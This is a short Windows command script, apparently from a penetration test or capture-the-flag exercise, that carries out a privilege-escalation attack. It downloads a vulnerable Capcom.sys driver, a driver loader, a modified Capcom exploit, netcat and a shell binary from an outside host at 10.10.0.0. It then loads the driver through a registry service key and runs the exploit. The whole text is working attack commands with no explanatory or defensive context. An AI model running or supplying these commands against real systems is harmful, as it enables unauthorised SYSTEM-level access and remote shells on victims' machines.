
mkdir c:\temp
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/Capcom.sys', 'C:\temp\Capcom.sys')
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/EOPLOADDRIVER.exe', 'C:\temp\EOPLOADDRIVER.exe')
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/ExploitCapcom_modded.exe', 'C:\temp\ExploitCapcom_modded.exe')
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/netcat.bat', 'C:\temp\netcat.bat')
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/shell.exe', 'C:\temp\shell.exe')
(New-Object Net.WebClient).downloadFile('http://10.10.0.0/nc.exe', 'C:\temp\nc.exe')
C:\temp\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
C:\temp\ExploitCapcom_modded.exe
